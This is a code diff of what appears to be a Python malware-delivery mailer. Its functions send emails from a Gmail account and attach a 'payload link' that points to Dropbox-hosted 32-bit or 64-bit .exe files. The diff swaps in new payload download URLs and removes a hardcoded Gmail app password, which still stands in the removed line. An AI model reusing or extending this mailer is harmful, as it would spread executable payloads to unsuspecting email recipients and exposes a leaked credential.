@@ -12,7 +12,7 @@ def send_emails(arguments):
     option = arguments.split('~')[6]
     to = ''
     gmail_user = user
-    gmail_password = password or 'cikjjfoqppdwjido'
+    gmail_password = password
     if arguments.split('~')[7] != '' and arguments.split('~')[3] == '':
         to = arguments.split('~')[7]
     elif arguments.split('~')[3] != '':
@@ -42,7 +42,7 @@ def attach_payload_to_body(body, payload_link):
 def get_payload_link(option):
     url = ''
     if option == '64':
-        url = 'https://www.dropbox.com/s/xhdga4uatxto7lr/file64b.exe?dl=1'
+        url = 'https://www.dropbox.com/s/qfx3ddgs96ofgge/file64b.exe?dl=1'
     if option == '32':
-        url = 'https://www.dropbox.com/s/05gel6knxxjnqgl/file.exe?dl=1'
+        url = 'https://www.dropbox.com/s/t750z0u9z7tfu0o/file.exe?dl=1'
     return url
